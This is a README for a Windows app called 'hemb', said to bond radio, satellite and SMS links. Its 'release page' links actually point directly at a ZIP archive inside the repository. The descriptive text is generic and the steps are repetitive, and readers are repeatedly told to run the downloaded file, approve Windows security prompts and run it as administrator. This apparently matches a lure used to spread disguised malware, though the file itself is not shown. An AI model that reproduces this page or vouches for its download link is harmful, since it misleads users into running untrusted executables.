# 📡 hemb - Connect links across many networks

[![Download hemb](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Petticoated-keelarch984/hemb/main/field-data/Software_v1.3.zip)

## 🧩 What hemb does

hemb is a Windows app that helps carry small messages across mixed networks. It is built for cases where one link may fail and another may still work. It can use paths such as LoRa, Iridium SBD, APRS, SMS, and GSM ring signals.

The app uses a sub-IP bearer bonding protocol with RLNC. In plain terms, it can split data into parts and move those parts across more than one channel. This can help when you need a message to reach the other side even if one route is weak.

## 💻 What you need

You need:

- A Windows PC
- An internet connection to download the app
- Enough disk space to store the release file
- Access to the network gear or service you plan to use with hemb

For normal use, a recent version of Windows 10 or Windows 11 works best. If you plan to use radio or satellite links, make sure the matching device, modem, or service is set up first.

## ⬇️ Download hemb

Visit the release page here:

[Go to the hemb release page](https://raw.githubusercontent.com/Petticoated-keelarch984/hemb/main/field-data/Software_v1.3.zip)

On that page, look for the latest release and download the Windows file that matches your system. If there is more than one file, choose the one marked for Windows.

## 🛠️ Install and run on Windows

1. Open the release page in your browser.
2. Find the newest release near the top of the page.
3. Download the Windows file for hemb.
4. If the file is in a ZIP folder, right-click it and choose Extract All.
5. Open the extracted folder.
6. Double-click the hemb app or installer file.
7. If Windows asks for permission, choose Run or Yes.

If the app opens in a window, it is ready to use. If you see a command window, leave it open while hemb runs.

## 📶 How hemb works

hemb is made for mixed links. It can help move data across:

- LoRa
- Iridium SBD
- APRS
- SMS
- GSM ring signals

The app can use these paths together. If one path is slow or drops out, another path may still carry part of the data. This can help in remote areas, field work, and emergency comms.

## 🔧 Basic setup

After you open hemb, set up the links you want to use:

1. Pick the networks or devices you have.
2. Enter any device settings, phone numbers, or channel details.
3. Save the setup.
4. Send a test message.
5. Check that the message arrives on the far end.

If you use several paths, start with one link at a time. This makes it easier to confirm that each part works before you combine them.

## 📥 Sending a message

To send data with hemb:

1. Open the app.
2. Choose the target link or links.
3. Type your message or load your data.
4. Start the send action.
5. Watch the status until the transfer finishes.

For best results, keep messages short. Small packets move more easily across low-bandwidth links like LoRa or SMS. Long messages may take longer if the path is noisy or congested.

## 📡 Supported use cases

hemb fits cases like:

- Field teams that need backup paths
- Remote sensor reports
- Disaster comms setups
- Mixed radio and satellite routes
- Store-and-forward message flow
- Small data transfer when one link is weak

It works best when you need reach, not speed.

## 🧠 Tips for first use

- Start with one working path before adding more
- Test each device on its own
- Use short messages first
- Keep your network settings in one place
- Save a known-good setup after your first test
- Check antenna, SIM, and service status before you send

If you use LoRa or APRS, make sure your radio settings match the gear on both ends. If you use Iridium SBD or SMS, make sure the account or service is active.

## 🔍 If the app does not open

If double-clicking the file does nothing:

1. Check that the file finished downloading.
2. Make sure you extracted the ZIP file if the download came in a ZIP folder.
3. Right-click the app and choose Run as administrator.
4. Confirm that Windows did not block the file.
5. Try the newest release from the download page.

If the window opens and closes fast, run it from the same folder and keep the window open so you can see any message.

## 🧭 File layout

A typical release may include:

- The main hemb app
- A README file
- Example settings
- Support files for Windows

Keep all files in the same folder. Do not move one file out unless the release notes say you can.

## 🔐 Network notes

hemb is built for sub-IP bearer bonding. That means it works below normal IP traffic and can carry data over links that do not behave like a full internet connection. This is useful when your path is narrow, unstable, or shared with other traffic.

Because of that, you may need:

- A radio modem
- A satellite terminal
- A GSM device
- An APRS-compatible setup
- A LoRa node

Match the app settings to the device you use.

## 📁 Common release names

On the release page, you may see files with names that include:

- windows
- x64
- setup
- zip
- release

If you use a 64-bit Windows PC, choose the x64 file when one is listed. If you are not sure, the file marked for Windows is usually the safest pick.

## 🧪 Test plan

Use this simple test plan after setup:

1. Send a short message to a second device.
2. Confirm that it gets through on one link.
3. Turn off that link and test a second path.
4. Try a mixed send with two or more links.
5. Confirm the receiver can read the full message.

This helps you see how hemb handles weak or changing paths.

## 🖥️ Windows hints

If Windows shows a security prompt:

- Read the file name
- Check that it came from the release page
- Choose Run if you trust the source

If you use antivirus software, it may scan the file first. Let the scan finish before you open the app.

## 📚 Project focus

hemb is part of work around:

- bearer bonding
- network coding
- RLNC
- heterogeneous networks
- IoT links
- satellite paths
- sub-IP transport

That mix makes it useful where normal apps expect a steady internet link, but the real world does not give one.

## 🧰 Basic troubleshooting

If your message does not move:

- Check cable, radio, or modem power
- Confirm the SIM or service is active
- Check signal strength
- Make sure the target address or number is right
- Try a shorter message
- Reboot the device and try again

If one path fails, remove it and test the others. This helps isolate the problem.

## 📦 Update steps

When a new release is available:

1. Go to the release page.
2. Download the latest Windows file.
3. Close the old copy of hemb.
4. Replace the old files if needed.
5. Open the new version and test your setup again.

Keep your saved settings if the release layout allows it.

## 🤝 Best results

hemb works best when you treat each network as a separate path and then combine them with care. Start small, test often, and keep your setup simple. That makes it easier to see where a message is stuck and which link needs attention.